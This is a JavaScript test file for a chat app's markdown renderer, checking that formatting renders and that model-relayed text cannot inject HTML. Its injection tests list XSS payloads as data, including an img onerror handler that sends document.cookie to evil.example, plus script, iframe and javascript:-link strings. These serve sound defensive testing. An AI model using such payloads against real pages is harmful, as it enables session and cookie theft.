// The surface rendered every answer with `textContent`, so a reply the model
// had structured — headings, numbered steps, bold names, a code block — arrived
// as one wall of characters with `**Perform Digital**` sitting in the middle of
// it. The model was doing its half correctly and the screen threw it away.
//
// The security half matters more than the formatting half. This text comes from
// a model, and the model reads web pages, chat messages and documents written by
// other people. Anything that reaches innerHTML has to be incapable of carrying
// a tag it was not given.

import test from "node:test";
import assert from "node:assert/strict";
import { escapeHtml, renderMarkdown } from "../../apps/desktop/markdown.js";

// ---- the formatting that was being lost ------------------------------------

test("bold, italic and inline code stop being literal characters", () => {
  const html = renderMarkdown("**Perform Digital** is *remote* and uses `LangGraph`");
  assert.match(html, /<strong>Perform Digital<\/strong>/);
  assert.match(html, /<em>remote<\/em>/);
  assert.match(html, /<code>LangGraph<\/code>/);
  assert.ok(!html.includes("**"), "the asterisks are still on screen");
});

test("a numbered list is a list, not a paragraph", () => {
  const html = renderMarkdown("Steps:\n1. Read the resume\n2. Search the boards\n3. Apply");
  assert.match(html, /<ol>/);
  assert.equal((html.match(/<li>/g) ?? []).length, 3);
});

test("a bulleted list survives, including a wrapped item", () => {
  const html = renderMarkdown("- first item\n- second item that\n  wraps onto another line\n- third");
  assert.equal((html.match(/<li>/g) ?? []).length, 3);
  assert.match(html, /second item that wraps onto another line/);
});

test("headings render, and never as h1 — a chat bubble is not a page", () => {
  const html = renderMarkdown("# Title\n## Subtitle");
  assert.ok(!html.includes("<h1>"), "h1 inside a message is shouting");
  assert.match(html, /<h2>Title<\/h2>/);
  assert.match(html, /<h3>Subtitle<\/h3>/);
});

test("a fenced code block keeps its contents literally", () => {
  const html = renderMarkdown("Run this:\n```bash\nnpm run doctor && echo **not bold**\n```");
  assert.match(html, /<pre class="md-code"><code class="lang-bash">/);
  assert.match(html, /npm run doctor/);
  assert.ok(!html.includes("<strong>not bold</strong>"), "markup inside a code fence must stay literal");
});

test("a table becomes a table", () => {
  const html = renderMarkdown("| Role | Pay |\n|---|---|\n| AI Intern | 6000 |");
  assert.match(html, /<table class="md-table">/);
  assert.match(html, /<th>Role<\/th>/);
  assert.match(html, /<td>AI Intern<\/td>/);
});

test("paragraphs are separate, which is the whole complaint", () => {
  const html = renderMarkdown("First thought.\n\nSecond thought.");
  assert.equal((html.match(/<p>/g) ?? []).length, 2);
});

// ---- the things that must NOT be treated as markup -------------------------

test("snake_case and file paths are not italics", () => {
  for (const text of ["read_file and write_file", "C:\\Users\\me\\my_notes_file.txt", "some_variable_name"]) {
    const html = renderMarkdown(text);
    assert.ok(!html.includes("<em>"), `"${text}" was mangled into italics: ${html}`);
  }
});

test("markup inside a code span is characters, not markup", () => {
  const html = renderMarkdown("use `**literal**` here");
  assert.match(html, /<code>\*\*literal\*\*<\/code>/);
});

// ---- injection: the text comes from pages the agent read -------------------

test("a script tag in the model's text cannot become a script tag on the page", () => {
  const html = renderMarkdown('Here is what the page said: <script>alert("xss")</script>');
  assert.ok(!/<script/i.test(html), `a script tag survived: ${html}`);
  assert.match(html, /&lt;script&gt;/);
});

// THE GENERAL CHECK, NOT ONE PAYLOAD AT A TIME.
//
// Listing hostile strings is a race against whoever writes the next one. The
// invariant is narrower and checkable: the ONLY tags that may appear in the
// output are the ones this renderer writes itself. Anything else means text
// became markup, whatever it happened to say.
const ALLOWED_TAGS = new Set([
  "p", "br", "hr", "strong", "em", "del", "code", "pre", "a", "blockquote",
  "ul", "ol", "li", "h2", "h3", "h4", "h5", "h6", "table", "thead", "tbody", "tr", "th", "td"
]);

const tagsIn = (html) => [...html.matchAll(/<\/?([a-zA-Z][a-zA-Z0-9]*)/g)].map((match) => match[1].toLowerCase());

test("no tag the renderer did not write itself can appear in the output", () => {
  const hostile = [
    '<img src=x onerror="fetch(\'https://evil.example/\'+document.cookie)">',
    '<script>alert(1)</script>',
    '<iframe src="https://evil.example"></iframe>',
    '<svg/onload=alert(1)>',
    '<a href="javascript:alert(1)">click</a>',
    '<style>body{display:none}</style>',
    '<form action="https://evil.example"><input name=x></form>',
    "Normal text with <b>bold html</b> that the model copied off a page",
    "```\n<script>alert(1)</script>\n```",
    "- <script>alert(1)</script>"
  ];
  for (const source of hostile) {
    const html = renderMarkdown(source);
    for (const tag of tagsIn(html)) {
      assert.ok(ALLOWED_TAGS.has(tag), `"${source}" produced a <${tag}> — text became markup:\n${html}`);
    }
  }
});

test("an event handler survives only as visible text, never as an attribute", () => {
  const html = renderMarkdown('<img src=x onerror="alert(1)">');
  assert.ok(!/<img/i.test(html), "a live img tag reached the page");
  assert.match(html, /&lt;img/, "the tag should be shown to the user as the text it is");
});

test("a javascript: link is refused, and an ordinary link is not", () => {
  const hostile = renderMarkdown("[click me](javascript:alert(1))");
  assert.ok(!/href="javascript/i.test(hostile), `a javascript: href survived: ${hostile}`);

  const ordinary = renderMarkdown("[Internshala](https://internshala.com/internships/)");
  assert.match(ordinary, /<a href="https:\/\/internshala\.com\/internships\/"/);
  assert.match(ordinary, /rel="noopener noreferrer"/, "a target=_blank link without rel=noopener hands over window.opener");
});

test("a data: URI link is refused", () => {
  const html = renderMarkdown("[x](data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==)");
  assert.ok(!/href="data:/i.test(html));
});

test("escapeHtml covers every character that can open a tag or close an attribute", () => {
  assert.equal(escapeHtml(`<>&"'`), "&lt;&gt;&amp;&quot;&#39;");
});

// The renderer walks lines in a while loop; a malformed fence must not spin.
test("an unterminated code fence terminates", () => {
  const html = renderMarkdown("```js\nconst a = 1;\nstill going");
  assert.match(html, /<pre class="md-code">/);
  assert.match(html, /still going/);
});
